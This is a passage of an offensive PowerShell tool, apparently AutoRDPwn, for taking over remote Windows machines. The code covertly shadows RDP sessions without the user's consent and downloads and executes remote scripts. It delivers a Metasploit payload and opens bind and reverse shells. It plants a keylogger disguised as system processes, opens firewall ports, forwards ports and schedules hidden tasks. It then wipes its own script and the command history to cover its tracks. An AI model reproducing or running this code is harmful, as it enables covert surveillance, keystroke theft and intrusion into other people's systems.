        attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null ; attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null ; Start-Sleep -milliseconds 7500 ; rm .\Setup.msi 2>&1> $null }}

        $shadow = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer).SessionId } ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; Write-Host ; Write-Host "$txt35" ; Start-Sleep -milliseconds 2500
        if($OSVersion -like 'Unix'){ if(!$user){ xfreerdp /v:$computer /restricted-admin /u:$user } else { xfreerdp /v:$computer /admin /u:$user /p:$password }}
        if(!$nogui){ if($vncserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')
        if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer }} else {
        if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
        if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}}

$Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
if ($nogui){ $remotehost = $env:computername.tolower() ; Write-Host $txt66 -ForegroundColor Green ; Write-Host ; Write-Host "mstsc /v $remotehost /admin /shadow:$shadow /control /noconsentprompt /prompt /f" ; Write-Host
if ($createuser -like '-createuser') { $hash ="true" ; invoke-command -session $RDP[0] -scriptblock { powershell.exe -windowstyle hidden $using:Pwn5 }}}
else { Write-Host $txt38 -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }

if ($hash){ invoke-command -session $RDP[0] -scriptblock {
$script = 'net user AutoRDPwn /delete ; cmd /c rmdir /q /s C:\Users\AutoRDPwn ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false ; $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript'
echo $script > $env:TEMP\script.ps1 ; $file = "$env:TEMP\script.ps1"
$action = New-ScheduledTaskAction -Execute powershell -Argument "-ExecutionPolicy ByPass -NoProfile -WindowStyle Hidden $file" ; $time = (Get-Date).AddHours(+2) ; $trigger =  New-ScheduledTaskTrigger -Once -At $time
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -Description "AutoRDPwn" -TaskPath Microsoft\Windows\Powershell\ScheduledJobs -User "System" > $null }}

if ($webserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Start-WebServer.ps1')
invoke-command -session $RDP[0] -scriptblock { netsh advfirewall firewall delete rule name="Powershell Web Server" 2>&1> $null
netsh advfirewall firewall add rule name="Powershell Web Server" dir=in action=allow protocol=TCP localport=8080 2>&1> $null ; Write-Host
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
Write-Host "Powershell Web Server -->` " -NoNewLine -ForegroundColor Green ; Write-Host http://$using:computer`:8080 -ForegroundColor Blue
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host }
invoke-command -session $RDP[0] -scriptblock ${function:Start-WebServer}}

if ($metasploit){ $metascript = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-MetasploitPayload.ps1')
invoke-command -session $RDP[0] -scriptblock { Set-Content -Value $using:metascript -Path Invoke-MetasploitPayload.ps1 ; Import-Module .\Invoke-MetasploitPayload.ps1 ; Write-Host
Write-Host "==================== Metasploit Web Delivery =========================" -ForegroundColor Gray
Invoke-MetasploitPayload "http://$using:metaserver`:4433/$using:metarandom" -verbose
Write-Host "======================================================================" -ForegroundColor Gray ; Write-Host ; Start-Sleep -milliseconds 7500 ; del .\Invoke-MetasploitPayload.ps1 }}

if ($netcat -in 'local'){ $netcatpsone = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PowerShellTcp.ps1')
invoke-command -session $RDP[0] -scriptblock { Set-Content -Value $using:netcatpsone -Path Invoke-PowerShellTcp.ps1 ; Import-Module .\Invoke-PowerShellTcp.ps1
Write-Host ; netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
netsh advfirewall firewall add rule name="Powershell Remote Control Application" dir=in action=allow protocol=TCP localport=$using:ncport 2>&1> $null
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
Write-Host "$using:txt51 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "nc $using:computer $using:ncport" -ForegroundColor Blue
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
Invoke-PowerShellTcp -Bind -Port $using:ncport ; del .\Invoke-PowerShellTcp.ps1 }}
 
if ($netcat -in 'remote'){ $netcatpsone = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PowerShellTcp.ps1')
invoke-command -session $RDP[0] -scriptblock { Set-Content -Value $using:netcatpsone -Path Invoke-PowerShellTcp.ps1 ; Import-Module .\Invoke-PowerShellTcp.ps1 ; Write-Host
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
Write-Host "$using:txt52 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "nc -l $using:ncport" -ForegroundColor Blue
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host ; Start-Sleep -milliseconds 7500
Invoke-PowerShellTcp -Reverse -IPAddress $using:ipadress -Port $using:ncport ; del .\Invoke-PowerShellTcp.ps1 }}

if ($getkeys){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Keylogger.ps1')
invoke-command -session $RDP[0] -scriptblock { Set-Content -Path $env:temp\dllhost.exe -Value $using:Content1 -Encoding Byte ; Set-Content -Path $env:temp\svchost.exe -Value $using:Content2 -Encoding Byte
cd $env:temp ; .\dllhost.exe nomsg explorer.exe "$pwd\svchost.exe" ; Write-Host
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
Write-Host "                 Remote Keylogger " -NoNewLine -ForegroundColor Green ; Write-Host "| " -NoNewLine -ForegroundColor Gray ; Write-Host "Press 'x' to stop                 " -ForegroundColor Blue
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
do { Get-Content -wait $env:localappdata\config.dat
if ([Console]::KeyAvailable) { $key = [Console]::ReadKey($true)
if ($key.key -eq "x") { Write-Output "You pressed 'x' to stop" ; break }}}
until($key.key -eq "x")}}

if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
else { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 } if($tsfail) { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}
$PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript ; del (Get-PSReadlineOption).HistorySavePath ; Remove-Exclusions 2>&1> $null ; Set-Clipboard $null 2>&1> $null
